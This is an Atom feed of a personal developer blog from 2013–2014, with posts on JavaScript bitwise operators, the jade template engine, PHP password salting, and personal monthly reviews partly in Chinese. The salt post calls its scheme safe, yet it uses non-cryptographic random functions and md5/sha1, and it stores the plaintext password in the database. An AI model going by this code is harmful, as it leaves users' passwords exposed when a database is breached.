+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span> <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// -1</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="o">-</span><span class="mi">2147483648</span> <span class="o">|</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// -1</span>
+
+<span class="c1">// Even or Odd, Odd returns 1, Even returns 0</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">1111</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// 1</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">2222</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// 0</span>
+
+<span class="c1">// ~x will return -(x + 1)</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span><span class="p">));</span> <span class="c1">// -(x + 1)</span>
+
+<span class="c1">// x ^ 0 will return x, x ^ -1 will return ~x</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span> <span class="o">^</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// random number x</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span> <span class="o">^</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// ~x</span>
+
+<span class="c1">// x &lt;&lt; y will return x * 2 ^ y (^ is power)</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span> <span class="c1">// 128</span>
+
+<span class="c1">// replace name.indexOf(subName) === 3</span>
+<span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="s1">&#39;Tinple&#39;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">subName</span> <span class="o">=</span> <span class="s1">&#39;ple&#39;</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">~</span><span class="nx">name</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">subName</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// if true</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="c1">// if else</span>
+<span class="p">}</span>
+</pre></div>
+
+<h2 id="toc_4">END</h2>
+<p>Using bitwise operator correctly will enhance your code performance.
+And the datas in this post are tested in <a href="https://code.google.com/p/v8/">V8</a>, if exist some errors, welcome to point it! </p>
+
+<h3 id="toc_5">References:</h3>
+
+<ul>
+<li><a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators">MDN</a></li>
+<li><a href="http://www.cnblogs.com/rubylouvre/p/3183616.html">rubylouvre</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Using jade template engine]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/using-jade-template-engine"/>
+        <published>2014-01-22T00:00:00+08:00</published>
+        <updated>2014-09-25T18:24:58+08:00</updated>
+        <id>http://tinple.io/tech/using-jade-template-engine</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>These days I touched a node template engine <code>jade</code>. I loved it at once because its <code>zencoding</code> grammar really attracts me.</p>
+<p>Unlike other template engine such as <code>EJS</code> and <code>handlebars</code>, <code>jade</code> has its own elegancy and lots of features. Firstly, you can install it via npm: <code>npm install jade -g</code> or <code>npm install jade</code>. And if you install it globally, try to detect whether the <code>$NODE_PATH</code> includes the location that npm installs globally or not.</p>
+
+<pre><code>@tinple ➜  ~  which node
+/usr/local/bin/node
+@tinple ➜  ~  which npm
+/usr/local/bin/npm
+@tinple ➜  ~  echo $NODE_PATH
+/usr/local/lib/node_modules</code></pre>
+<p>If your <code>$NODE_PATH</code> is null, try to add</p>
+
+<pre><code>export NODE_PATH=/usr/local/lib/node_modules</code></pre>
+<p>to your <code>.bash_profile</code> or <code>.zshrc</code>. The path is not absolute, it depends on your node directory.</p>
+<p>Jade is a clean, whitespace sensitive syntax for writing html. Just ignore the process that how to turn <code>.jade</code> to <code>.html</code> at begin. Pay attention to its succinct writemode, for example, file <code>demo.jade</code>:</p>
+
+<pre><code>doctype html
+html(lang=&quot;en&quot;)
+  head
+    title= pageTitle
+  body
+    h1 Hello #{name}
+    ul#books
+      li.A
+        a(href=&quot;#book-a&quot;) Book A
+      li.B
+        a(href=&quot;#book-b&quot;) Book B
+    // comment
+    p.
+      Tinple and Kristine
+
+    if love
+      p A couple
+    else
+      p Single man</code></pre>
+<p>and locals:</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">locals</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">pageTitle</span><span class="o">:</span> <span class="s1">&#39;Jade&#39;</span><span class="p">,</span>
+    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tinple&#39;</span><span class="p">,</span>
+    <span class="nx">love</span><span class="o">:</span> <span class="kc">true</span>
+<span class="p">}</span>
+</pre></div>
+<p>Finally it becomes:</p>
+<div class="highlight"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">&quot;en&quot;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;title&gt;</span>Jade<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Hello Tinple<span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;ul</span> <span class="na">id=</span><span class="s">&quot;books&quot;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">&quot;A&quot;</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;#book-a&quot;</span><span class="nt">&gt;</span>Book A<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">&quot;B&quot;</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;#book-b&quot;</span><span class="nt">&gt;</span>Book B<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+        <span class="nt">&lt;/ul&gt;</span>
+        <span class="c">&lt;!-- comment--&gt;</span>
+        <span class="nt">&lt;p&gt;</span>Tinple and Kristine<span class="nt">&lt;/p&gt;</span>
+        <span class="nt">&lt;p&gt;</span>A couple<span class="nt">&lt;/p&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></div>
+<p>And there are many other features <a href="http://naltatis.github.io/jade-syntax-docs/">there</a>, you can learn it by yourself. Next talking about its <code>api</code>, <code>command line</code> and <code>browser-support</code>, yes, jade supports them.</p>
+
+<h2 id="toc_0">Command Line</h2>
+<p>When <code>jade</code> is installed, you can run with <code>jade --help</code> to look for the usage. For the above example, you can run with</p>
+
+<pre><code>jade --obj demo.json demo.jade</code></pre>
+<p>demo.json:</p>
+
+<pre><code>{
+    &quot;pageTitle&quot;: &quot;Jade&quot;,
+    &quot;name&quot;: &quot;Tinple&quot;,
+    &quot;love&quot;: true
+}</code></pre>
+<p>Then the std push the data <code>rendered demo.html</code>. And that&#39;s the result. Also, you can use other command options to meet your own requirements.</p>
+
+<h2 id="toc_1">API</h2>
+<p>Jade offers <code>api</code> to developers. For full API, see <a href="http://jade-lang.com/api/">there</a>. Below is the simple usage for compile, render string or a file.</p>
+<p>runDemo.js:</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">jade</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jade&#39;</span><span class="p">),</span>
+    <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">pretty</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="nx">debug</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="nx">compileDebug</span><span class="o">:</span> <span class="kc">true</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">locals</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">pageTitle</span><span class="o">:</span> <span class="s1">&#39;Jade&#39;</span><span class="p">,</span>
+    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tinple&#39;</span><span class="p">,</span>
+    <span class="nx">love</span><span class="o">:</span> <span class="kc">true</span>
+<span class="p">}</span>
+
+<span class="c1">// three ways, just choose one</span>
+
+<span class="c1">// compile</span>
+<span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="s1">&#39;demo.jade&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nx">jade</span><span class="p">.</span><span class="nx">compile</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="nx">fn</span><span class="p">(</span><span class="nx">locals</span><span class="p">);</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="c1">// render, pseudocode</span>
+<span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="nx">jade</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;string of jade&#39;</span><span class="p">,</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">locals</span><span class="p">));</span>
+
+<span class="c1">// renderFile</span>
+<span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="nx">jade</span><span class="p">.</span><span class="nx">renderFile</span><span class="p">(</span><span class="s1">&#39;demo.jade&#39;</span><span class="p">,</span> <span class="nx">locals</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
+</pre></div>
+<p>Choose any way, if just like me, just render the file, then run with <code>node runDemo.js</code>, and you will see the result in your terminal. For more details like the options or other function arguments, try to read the document api.</p>
+
+<h2 id="toc_2">Browsers Support</h2>
+<p>The latest version of jade can be download for the browser. And it only supports the very latest browsers. I strongly recommended that you pre-compile your jade templates to JavaScript and then just use the runtime.js library on the client. So how does <code>client-side template</code> works? The whole workflow looks like this:</p>
+
+<ol>
+<li><p>Edit <code>.jade</code> file</p></li>
+<li><p>Compile template files to JavaScript</p></li>
+<li><p>Include runtime.js file</p></li>
+</ol>
+<p>So edit demo.jade first, we can copy it easily. Then run with</p>
+
+<pre><code>jade --client --no-debug demo.jade</code></pre>
+<p>you will get a file <code>demo.js</code> which is JavaScript function that you call with values you want to render your template with and func returns you HTML that you just need to put somewhere on page. Now you just need to include that Jade runtime plus this file that got generated via:</p>
+<div class="highlight"><pre><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&#39;runtime.js&#39;</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&#39;demo.js&#39;</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&#39;http://code.jquery.com/jquery-1.10.2.min.js&#39;</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;body&#39;</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="nx">template</span><span class="p">({</span><span class="nx">pageTitle</span><span class="o">:</span> <span class="s1">&#39;Jade&#39;</span><span class="p">,</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tinple&#39;</span><span class="p">,</span> <span class="nx">love</span><span class="o">:</span> <span class="kc">true</span><span class="p">}));</span>
+<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+<p>File <code>runtime.js</code> is in your jade source code directory.</p>
+
+<h2 id="toc_3">END</h2>
+<p><code>jade</code> is nice, not only <code>express</code> uses it but also there are many more developers push the contributions about the jade on <a href="https://github.com/">github</a>, this essay just introduces a little, for more reading, like its feature(mixin, filter, include…etc), api, implementations or many other, visiting <a href="https://github.com/visionmedia/jade/">jade</a>.</p>
+
+<h3 id="toc_4">References:</h3>
+
+<ul>
+<li><a href="http://jade-lang.com/">jade</a></li>
+<li><a href="https://github.com/visionmedia/jade">jade-github</a></li>
+<li><a href="http://stackoverflow.com/questions/12594541/npm-global-install-cannot-find-module">npm-global-install</a></li>
+<li><a href="http://goranperetin.com/post/26701804893/client-side-templating-with-jade-and-node-js#notes">client-side-jade</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Monthly review for Nov.2013]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/life/monthly-review-for-nov-2013"/>
+        <published>2013-11-30T00:00:00+08:00</published>
+        <updated>2014-09-24T14:46:00+08:00</updated>
+        <id>http://tinple.io/life/monthly-review-for-nov-2013</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0">Tech:</h2>
+
+<ol>
+<li><p>月初买了本《Node.js 入门经典》，在准备比赛闲暇看了大部分内容，感受最深的是如果这辈子不接触下Node.JS都不好意思说异步了。这丫简直太强大了！倒是这个月忙着比赛的事情没太多实践过，寒假要好好学下。</p></li>
+<li><p> 初步浅阅了《Javascript模式》，讲的很深入，大部分内容跟乌龟书讲的差不多。不过也深受俾益。</p></li>
+<li><p> 借着项目回顾了暑假学的Python笔记，回想起了很多，下个月也是正式接触Python的Web编程。P.S.：PHP，Python，Node.JS天啊。。我觉得自己是个疯子。</p></li>
+<li><p>这个月再一次在stackoverflow上被吐槽提问不明确，问题不清晰。也是意识到自己用英文表述问题的缺陷（沟通）。也是因此开始积极参与到<a href="http://stackoverflow.com">stackoverflow</a>中去。</p></li>
+<li><p> 一次攻防大赛让自己学到了许多零零散散的东西，比如服务器的iptables，Linux下高效的工作方式，以及其他种种。也是尝试自己做了几道题，深感佩服黑客们强大的思维。P.S.：据说服务器上收获了好多马。。。</p></li>
+</ol>
+
+<h2 id="toc_1">Work:</h2>
+
+<ol>
+<li><p> 这个月初赛和决赛的圆满举办，坚信<strong>teamwork</strong>的确是我所喜欢且愿意为团队积极投入进去的。一方面是自己的责任感与担当，一方面是团队合作成功带来的兴奋与成就感，也不再是孤军奋战，尤其是任何一个人都是团队的核心的时候。</p></li>
+<li><p>  大二上班级还是成功举办了秋游，虽然相比前两次的确不怎么样，但还是能凑齐26个人实属不易。也是由此引发对一个集体的思考，在初期火候旺盛的情况下如何才能最大化的保住后期的火候呢？的确是需要很强大的管理能力。</p></li>
+<li><p>再一次向新生培训，但结果自己不是很满意，一来准备匆匆心不在焉，二来的确是自己的表达能力需要锻炼。做技术的，自己人沟通互相了解是一点，向小白讲述让他明白又是另一点，这很重要。</p></li>
+</ol>
+
+<h2 id="toc_2">Life:</h2>
+
+<ol>
+<li><p>这个月白天几乎大部分时间花在了比赛上，晚上倒还是很早地就回寝睡了，寝室差点就成了只是一个休息的地方。愧疚。筹备比赛的日子倒还是挺滋润的。</p></li>
+<li><p>比赛结束后的月末休息了一阵，想仔细回味记录下这几个月的忙碌，却也又是浮躁地最终还是没去写，只是头脑里闪现出许多片段。还没找到接下来奋斗的点，倒也悠哉悠哉。</p></li>
+</ol>
+
+<h2 id="toc_3">End:</h2>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Salt Cryptography]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/salt"/>
+        <published>2013-11-14T00:00:00+08:00</published>
+        <updated>2014-09-24T14:51:10+08:00</updated>
+        <id>http://tinple.io/tech/salt</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>Last three months ago, I made a single page web application to let users register their own team. As the password usually users fill in will make some inconvenience in our
+cyber ​​security competition, I took a service to send a email which including an automatic generation password. And what I do is adding salt in password to confirm the security.</p>
+<p>So what&#39;s called salt?</p>
+
+<blockquote>
+<p>In cryptography, a salt is random data that are used as an additional input to a one-way function that hashes a password or passphrase.</p>
+</blockquote>
+<p>And a new salt is randomly generated for each password. In my apply page, the 
+salt and the password are concatenated and processed with a cryptographic hash function, and the resulting output (but not the original password) is sent to users email while the salt and the original password is stored in a database. </p>
+<p>Hashing allows for later authentication while defending against compromise of the plaintext password in the event that the database is somehow compromised. And
+in this way, the output password will be somehow entirely safe although the original password may be cracked.</p>
+<p>All right, it is time to begin. In <code>PHP</code>, the code like this:</p>
+
+<pre><code>$length = 32;
+$mode = 0;
+switch ($mode) 
+{
+    case '1':
+    $str = '1234567890';
+    break;
+    case '2':
+    $str = 'abcdefghijklmnopqrstuvwxyz';
+    break;
+    case '3':
+    $str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    break;
+    default:
+    $str = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    break;
+}
+$pass = '';
+$l = strlen($str) - 1;
+$num = 0;
+for($i = 0;$i &lt; $length;$i++){
+    $num = rand(0, $l);
+    $a = $str[$num];
+    $pass .= $a;
+}
+
+$saltLength = 6;
+$salt = '';
+for ($a = 0; $a &lt; $saltLength; $a++) {
+        $salt .= chr(mt_rand(97,122));    
+}
+
+echo 'Salt:' . $salt;
+echo '&lt;br&gt;';
+echo 'Original Password:' . $pass;  
+echo '&lt;br&gt;';
+// Simply add the salt to the end
+echo 'Outping:' . md5(sha1($pass.$salt));</code></pre>
+<p>That&#39;s all. And next you can do what you want to do, maybe send the output password to users via email or some other things.</p>
+<p>Remember that it is common for a web application to store in a database the hash value of a user&#39;s password. Without a salt, a successful SQL injection attack may yield easily crackable passwords. You can read more on <a href="http://en.wikipedia.org/wiki/Salt_%28cryptography%29">wiki</a> about the beneficial of the salt.</p>
+<p>Have fun :D</p>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[HangZhou Marathon]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/life/memory-marathon"/>
+        <published>2013-11-03T00:00:00+08:00</published>
+        <updated>2014-09-24T14:44:17+08:00</updated>
+        <id>http://tinple.io/life/memory-marathon</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>第一次参加马拉松，12.8公里，在杭州。</p>
+<p>你一直在跑，但总是有人在你前面，有人在你后面。只不过当你停下来的时候，你前面的人就多了，哪怕你只是放缓脚步。马拉松如此，很多时候，生活也是如此。</p>
+<p>谨以此纪念，明年再来。</p>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[ISA Training Part Two]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/isa-training-2"/>
+        <published>2013-11-02T00:00:00+08:00</published>
+        <updated>2014-09-24T14:50:47+08:00</updated>
+        <id>http://tinple.io/tech/isa-training-2</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>Everytime when you open your own browser, you just step into a part of <strong>Web</strong> field.And just have a glance of those web pages on the browser.</p>
+
+<ul>
+<li><a href="http://weibo.com">weibo</a></li>
+<li><a href="http://www.zhihu.com">zhihu</a></li>
+<li><a href="http://taobao.com">taobao</a></li>
+</ul>
+<p>Look at their design, layout and user experience, you may find some different stuffs, and recall what if we visit those websites on a Remote-device?Besides, you see, the nature of them varies, SNS, Social Q &amp; A and C2C.</p>
+<p>And nowadays, much more like desktop system web applications appear, like <a href="http://web2.qq.com">webqq</a>, and one more amazing thing, <a href="http://copy.sh/v24/">x86-Simulator</a>.You just can not image it!</p>
+<p>However, <strong>no pain, no gain</strong>.Maybe it is really difficult for us to do the stuffs above.But we can hold it step by step, just see those single nice pages, it only requires your imagination.Or maybe you prefer to develop a web game, see the simple tetris game I coded long ago.Yep, you can also finish your own web application game! Even more helpful things like hduhelp.</p>
+<p><strong>Only time and determination require!</strong></p>
+<p>I will show you some skills you may love to learn, you can learn these skills following the order.</p>
+
+<ul>
+<li>HTML &amp; CSS</li>
+<li>Javascript</li>
+<li>NodeJs</li>
+<li>And maybe more other skills..(we will talk about it later)</li>
+</ul>
+<p>Wait, there are some useful tools I want to show you as well.</p>
+
+<ul>
+<li><a href="http://127.0.0.1:8080/#/title">Web Slide controlled remotely</a></li>
+<li><a href="http://www.zybuluo.com/mdeditor">online markdown editor</a></li>
+<li><a href="http://lab.lepture.com/liquidluck/">liquidluck</a></li>
+</ul>
+<p>Also some really nice stuffs we usually use, you may touch later if you want to insist on.</p>
+
+<ul>
+<li><a href="https://www.github.com">github</a></li>
+<li><a href="http://stackoverflow.com">stackoverflow</a></li>
+<li><a href="https://www.yinxiang.com/">evernote</a></li>
+<li>Git</li>
+</ul>
+<p>And if you have intersts about those things I refer, just find me directly and I will 
+tell you more after.Do not be shy!</p>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Monthly review for Oct.2013]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/life/monthly-review-for-oct-2013"/>
+        <published>2013-11-01T00:00:00+08:00</published>
+        <updated>2014-09-24T14:49:21+08:00</updated>
+        <id>http://tinple.io/life/monthly-review-for-oct-2013</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0">Tech</h2>
+<p>1.国庆回来后月初忙着报名平台的上线，忙乱中各种页面UI优化，功能测试，注入测试，最后还是赶在10号上线了。</p>
+<p>2.也是管中窥豹了一番web安全，学习了数据库权限(Privilege)的精确设置，数据的各种过滤，服务端文件的权限设置。</p>
+<p>3.第一次读完了英文影印版的Head First系列PHP &amp; Mysql，非常有趣，idea发散式学习，觉得比较适合入门看如果英文阅读能力强的话，但还是权当巩固基础知识了。</p>
+<p>4.月末在读Javascript的乌龟书，200多页精悍的书讲述着编程风格，编程实践等等，虽然现在缺少机会去参与团队协作开发，但现在看一点也不显早，相反的确帮我改进了许多coding习惯还有思维。</p>
+<p>5.间断性地读了一些框架的源码，比如codeigniter（CI），jQuery。感触最大的一点是它们整体的设计模式，还有编程，的确能学到许多，从中也是能看到它们之所以作为框架给予开发者的便捷之处。</p>
+<p>6.这个月学习的时候更侧重自己的<strong>英文阅读能力</strong>了，啃Head First系列的书时把不认识的单词全都摘记下来一个个google translate。总之现在觉得英语很重要。</p>
+
+<h2 id="toc_1">Work</h2>
+<p>1.随着10号报名平台的上线，也是跟协会的小伙伴们去摆了3天的摊。累归累，但这种活动收获还是颇多，校内宣传也基本到位。PS：怀念那个音箱。</p>
+<p>2.参与了院级的创新项目，混了小学妹的队。主要是觉得这个项目的idea很赞，但总隐隐感觉后续的发展绝不会如我们策划预料的那么吻合，潜在许多未知的隐患，真正做好很难。不过还是要赞一下这个idea。</p>
+<p>3.把以前存的乱七八糟零碎的东西都整理了一遍，开始合理有秩序地收集资料，方便以后需要的时候查找。也是整理了寝室的书桌和协会的桌子:D</p>
+<p>4.跟别人讨论马云强推来往的事，weibo上也是炒得很火。暂不论来往这个产品的好坏，总之觉得马云这事强制性做的比较成功。许多时候产品是一回事，宣传推广是一回事，至于结果，往往取决于两者之和。</p>
+<p>5.参加了今年10月的阿里云开发者大会，虽然地点设在偏僻的云溪小镇，到处都是来往的牌子。但是阿里人的热情真是火旺，从头到尾都很贴心。也看到了一些自己想看到的东西，引发了许多对产品的思考。听说随行的小伙伴还见到马云了。</p>
+<p>6.简单地思考了下以后的出路。暂时不说，继续努力，毕竟现在还远远不够。</p>
+
+<h2 id="toc_2">Life</h2>
+<p>1.国庆还是回了嘉兴，在那闷的慌没事做，呆了几天就匆忙回去了。换了个环境就不知道该去做什么，相信这的确是自己生活上一个赤裸裸的嘲讽。</p>
+<p>2.报名参加了今年11月份的杭州国际马拉松，报的短程12800。想去挑战下，或者又可以说是想跟小伙伴们去玩下:D</p>
+<p>3.这个月中旬写了每天Must to do的清单，但还是有一些没能坚持下来，比如每天一集美剧，每天shanbay打卡。反思。</p>
+<p>4.月末不是特别想坐在电脑前了，更倾向于捧着本书看，或者是去思考其他事。</p>
+
+<h2 id="toc_3">End</h2>
+<p>这个月大多事是围着<strong>攻防比赛</strong>这条主线进行的，跟9月还有不一样的是，这个月还忙着处理一些情感，一些琐事。
+10月，多了点忙碌带来的紧迫节奏感。PS:明天报名平台就关闭啦:D</p>
+]]>
+        </content>
+    </entry>
+</feed>
